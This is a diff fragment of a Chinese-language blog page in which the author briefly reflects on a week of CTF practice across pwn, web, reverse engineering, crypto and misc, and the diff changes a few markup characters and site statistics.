+<p>本周必需得总结一下，学了比较多（但同时也摸了比较多鱼），这周只ak了pwn（也只能akpwn了）。</p>
 <p>方向是pwn，总是先做出的题是web，这周也不例外。</p>
 <p>啃了一大波heap的资料后，才开始陆续解出pwn题，pwn是真的爽！</p>
 <p>Re一如既往地看着汇编蒙圈</p>
 <p>起码这次Crypto不是套公式了，因为ToyCipher_XorShift这题主要还是位运算，还是比较好做的（而且还发现我对python的strip这个函数误解很深）</p>
-<p>（misc脑洞好大<del>~</del>)</p>
+<p>（misc脑洞好大~~~)</p>
 
     </div>
 
@@ -1480,13 +1480,13 @@ flag <span class="token operator">=</span> <span class="token string">''</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">380k</span>
+    <span title="站点总字数">379k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">5:46</span>
+    <span title="站点阅读时长">5:45</span>
   </span>
 </div>
 <div class="busuanzi-count">
